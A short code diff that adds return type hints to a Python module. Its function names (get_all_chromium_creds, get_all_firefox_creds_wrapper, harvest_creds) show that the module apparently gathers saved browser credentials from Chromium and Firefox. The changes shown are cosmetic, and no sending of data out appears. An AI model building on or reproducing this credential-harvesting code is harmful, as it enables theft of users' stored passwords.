@@ -126,7 +126,7 @@ async def get_all_chromium_creds(use_b64: bool = False) -> typing.Dict[
     return all_credentials
 
 
-def get_all_firefox_creds_wrapper():
+def get_all_firefox_creds_wrapper() -> list:
     # noinspection PyBroadException
     try:
         # converts Generator[any] to list (executes all)
@@ -135,7 +135,7 @@ def get_all_firefox_creds_wrapper():
         traceback.print_exc()
 
 
-async def get_all_creds(use_b64: bool = False):
+async def get_all_creds(use_b64: bool = False) -> typing.Dict[str, any]:
     loop = asyncio.get_event_loop()
     all_creds, firefox_creds = await asyncio.gather(
         get_all_chromium_creds(use_b64=use_b64),
@@ -158,7 +158,7 @@ async def harvest_creds() -> typing.Tuple[str, str, str]:
 
 
 # noinspection PyTypeChecker
-def bin_to_str(obj: dict):
+def bin_to_str(obj: dict) -> dict:
     # converts any byte object nested into object to a string
     # note: this replaces errors and removes \u0000 characters for readability
     stack = deque([(obj, None, None)])
